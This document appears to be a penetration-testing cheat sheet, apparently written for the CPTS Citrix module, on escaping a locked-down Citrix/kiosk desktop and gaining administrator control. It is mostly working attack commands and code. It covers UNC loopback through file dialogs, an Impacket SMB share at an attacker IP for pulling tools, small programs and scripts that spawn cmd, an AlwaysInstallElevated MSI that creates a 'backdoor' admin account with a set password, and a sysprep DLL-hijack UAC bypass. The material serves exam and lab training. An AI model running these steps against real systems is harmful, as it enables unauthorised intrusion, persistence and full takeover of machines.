Full Breakout — Dialog Box + UNC Path → CMD → AlwaysInstallElevated (CPTS Citrix)

When to use: Landed in a restricted Citrix/kiosk desktop where cmd.exe/powershell.exe are hidden and File Explorer is GPO-restricted. Methodology: get a Windows dialog box → get command execution → escalate.

Step 1 — Open a Windows Dialog Box

Any of these use an Explorer component that is NOT bound by the File-Explorer GPO. Most reliable: MS Paint → File → Open.

Alternatives: Notepad, WordPad, IE (Ctrl+O), any Office app, any Print dialog.

Step 2 — Bypass Path Restrictions with UNC Loopback

In the dialog's File Name field (set File Type = All Files):

\\127.0.0.1\c$\users\pmorgan        # local C: via SMB — sidesteps the Explorer GPO
\\<ATTACKER_IP>\share               # your Impacket SMB share

Why this works: UNC loopback \\127.0.0.1\c$ reaches the local drive via SMB, which the File-Explorer path GPO doesn't catch. Always set File Type = "All Files" or only images show. CMD launched from a UNC path defaults to C:\Windows (expected).

Other UNC targets: \\<TARGET>\c$, \\<DOMAIN>\SYSVOL.

Step 3 — Serve Tools Over SMB and Run Them From the Dialog

Direct copy is blocked, but right-click → Open on an exe works:

impacket-smbserver -smb2support share $(pwd)    # -smb2support REQUIRED for modern Windows
## put in the dir: pwn.exe, Explorer++.exe, PowerUp.ps1, Bypass-UAC.ps1

pwn.c — spawns cmd when cmd.exe itself is blocked (the binary isn't restricted, only the Start Menu entry):

#include <stdlib.h>
int main(){ system("C:\\Windows\\System32\\cmd.exe"); }

x86_64-w64-mingw32-gcc pwn.c -o pwn.exe     # right-click pwn.exe in the dialog → Open → CMD spawns

Step 4 — Post-Breakout Workflow

cd C:\Users\pmorgan\Desktop                                 :: writable dir
powershell -ep bypass
xcopy \\<ATTACKER_IP>\share\Tool.ps1 .

Step 5 — Alternate Command-Execution Triggers (When Paint Blocked)

Shortcut hijack:

$s=New-Object -ComObject WScript.Shell
$l=$s.CreateShortcut("C:\Users\Public\shell.lnk")
$l.TargetPath="C:\Windows\System32\cmd.exe"
$l.Save()
## Then double-click shell.lnk

evil.bat — a 3-byte file that opens a console (New → Text Document, rename .bat, content = cmd):

cmd

evil.vbs:

Set shell = CreateObject("WScript.Shell") : shell.Run "cmd.exe"

Portable tools worth staging on the SMB share:

  • Explorer++ — unrestricted file browser when File Explorer is locked
  • SmallRegistryEditor / Uberregedit — registry access when regedit.exe is GPO-blocked

Step 6 — Escalate via AlwaysInstallElevated

:: Confirm both keys are 0x1 (BOTH must be set for the exploit)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Import-Module .\PowerUp.ps1
Write-UserAddMSI                                            # -> UserAdd.msi (runs as SYSTEM)
## Double-click UserAdd.msi → create backdoor / T3st@123 (complex!) in Administrators

runas /user:backdoor cmd        :: shell as the new local admin (UAC still filters the token)

Then bypass UAC to get high integrity:

cd C:\Users\Public
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep     # sysprep cryptbase.dll hijack → new ELEVATED PS window

## Verify:
whoami
dir C:\Users\Administrator\Desktop      # now accessible

Critical gotcha: the MSI user-add password must meet complexity rules or it fails silently. runas gives you the admin account but still a medium-integrity token — Bypass-UAC -Method UacMethodSysprep (or UACMe) is what actually elevates.
